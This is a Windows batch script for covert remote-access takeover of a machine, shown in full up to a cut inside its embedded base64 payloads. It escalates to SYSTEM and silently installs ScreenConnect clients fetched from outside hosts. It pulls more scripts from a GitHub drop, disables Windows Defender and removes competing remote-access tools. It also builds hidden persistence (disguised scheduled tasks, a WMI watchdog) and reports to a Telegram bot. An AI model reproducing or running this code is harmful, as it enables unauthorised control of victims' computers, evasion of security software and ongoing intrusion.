@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O35 - gryxa keep+install + quiet TG + BOOT schtasks
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "GRYXA=ScreenConnect Client (9908198e668e4750)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=9908198e668e4750"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_G=%TEMP%\sc_gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O35 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O35b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O35" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O35 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O35 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O35: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M25" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S7" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T15" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L14" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O35: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [5b] Ensure Gryxa SC (main beside sevrz)...
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo gryxa_already_running>>"%LOG%"
  goto :after_gryxa
)
sc query "%GRYXA%" >nul 2>&1
if not errorlevel 1 (
  sc start "%GRYXA%" >nul 2>&1
  timeout /t 4 /nobreak >nul
  sc query "%GRYXA%" | findstr /I RUNNING >nul
  if not errorlevel 1 goto :after_gryxa
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP3%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  timeout /t 5 /nobreak >nul
  sc query "%GRYXA%" | findstr /I RUNNING >nul
  if not errorlevel 1 goto :after_gryxa
)
set "GREG=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP3%" -WorkDir "%WD%"`) do set "GREG=%%R"
if /I "!GREG!"=="yes" (
  echo gryxa_registered_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP3%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  goto :after_gryxa
)
echo gryxa_install_begin>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%MSI_G%" "%MSIURL_GRYXA%" >>"%LOG%" 2>&1
if not exist "%MSI_G%" "%CURL%" -L --connect-timeout 30 --max-time 300 -o "%MSI_G%" "%MSIURL_GRYXA%" >>"%LOG%" 2>&1
for %%A in ("%MSI_G%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI_G%" "%MSICACHE_G%"
  call :NoMsiPolicy
  msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress >>"%LOG%" 2>&1
  echo gryxa_msiexec_exit=!ERRORLEVEL!>>"%LOG%"
  timeout /t 8 /nobreak >nul
)
sc config "%GRYXA%" start= auto >nul 2>&1
sc start "%GRYXA%" >nul 2>&1
:after_gryxa
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_running_ok>>"%LOG%") else (echo gryxa_still_down>>"%LOG%")

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O35/L13: Create like WucacheOwn — BOOT TR path + cmd schtasks + /ST (WD is ACL-locked)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
REM strip leading \ if present (IDENTVER 6/7 leftovers)
if "!TASK_A:~0,1!"=="\" set "TASK_A=!TASK_A:~1!"
if "!TASK_B:~0,1!"=="\" set "TASK_B=!TASK_B:~1!"
if "!TASK_C:~0,1!"=="\" set "TASK_C=!TASK_C:~1!"
if "!TASK_D:~0,1!"=="\" set "TASK_D=!TASK_D:~1!"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM TR under BOOT (Windows\Temp\.wucache) — same tree as working WucacheOwn detach
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\own_mon.cmd" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\etl_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

for /f "tokens=1-2 delims=:" %%H in ("%TIME%") do set "ST=%%H:%%I"
set "ST=!ST: =0!"
echo create_taskA_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_A!" /F >nul 2>&1
schtasks /Create /TN "!TASK_A!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_A! /ST !ST! /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_B!" /F >nul 2>&1
schtasks /Create /TN "!TASK_B!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_B! /ST !ST! /F /TR "cmd.exe /c %BOOT%\etl_mon.cmd" >>"%LOG%" 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_C!" /F >nul 2>&1
schtasks /Create /TN "!TASK_C!" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_D!" /F >nul 2>&1
schtasks /Create /TN "!TASK_D!" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "!TASK_A!" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_B!" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_C!" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_D!" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "!TASK_A!" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM also run lib tasks-ensure (idempotent repair / ownership check)
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%BOOT%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O35 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O35 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIw
MjYwODAyTTI1DQpyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50
aS1zaWduYXR1cmUpLCBtdXR1YWwNCnJlbSAgV01JK3NjaHRhc2tzIGNoYWlucywgTVNJIGZhbGxi
YWNrIGNoYWluLCBzdGF0ZS5qc29uLCBxdWlldCBkaWdlc3QuDQpyZW0gIEF1dGhvcml6ZWQgaW50
ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5Lg0KcmVtIOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
